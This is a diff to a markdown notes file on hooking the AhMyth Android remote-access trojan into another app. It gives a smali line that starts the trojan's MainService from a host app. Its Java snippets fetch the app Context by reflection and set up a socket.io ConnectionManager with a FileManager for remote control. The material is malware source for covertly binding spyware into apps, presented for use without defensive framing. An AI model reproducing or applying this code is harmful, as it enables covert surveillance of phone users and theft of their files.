@@ -2,7 +2,7 @@
 ```smali
 invoke-static {}, Lahmyth/mine/king/ahmyth/MainService;->start()V
 ```
-## New hopeful Hook start function
+## Java Files for new hook function
 - MainService.java
 ```java
     private static void findContext() throws Exception {
@@ -81,79 +81,29 @@ invoke-static {}, Lahmyth/mine/king/ahmyth/MainService;->start()V
 
     }
 ```
-- IOSocket.java
+- ConnectionManager.java
 ```java
-    // Launched from activity
+public class ConnectionManager {
 
-    public static void start(Context context) {
+    public static Context context;
 
-        IOSocket.context = context;
+    private static io.socket.client.Socket ioSocket;
 
-    }
+    private static FileManager fm = new FileManager();
 
-    public static void startContext() {
+    public static void startAsync(Context con)
 
-        try {
-
-            findContext();
-
-        } catch (Exception ignored) {
-
-        }
-
-    }
-
-    private static void findContext() throws Exception {
-
-        Class<?> activityThreadClass;
+    {
 
         try {
 
-            activityThreadClass = Class.forName("android.app.ActivityThread");
+            ConnectionManager.context = con;
 
-        } catch (ClassNotFoundException e) {
+            sendReq();
 
-            // No context
+        }catch (Exception ex){
 
-            return;
-
-        }
-
-        final Method currentApplication = activityThreadClass.getMethod("currentApplication");
-
-        final Context context = (Context) currentApplication.invoke(null, (Object[]) null);
-
-        if (context == null) {
-
-            // Post to the UI/Main thread and try and retrieve the Context
-
-            final Handler handler = new Handler(Looper.getMainLooper());
-
-            handler.post(new Runnable() {
-
-                public void run() {
-
-                    try {
-
-                        Context context = (Context) currentApplication.invoke(null, (Object[]) null);
-
-                        if (context != null) {
-
-                            start(context);
-
-                        }
-
-                    } catch (Exception ignored) {
-
-                    }
-
-                }
-
-            });
-
-        } else {
-
-            start(context);
+            startAsync(con);
 
         }
 
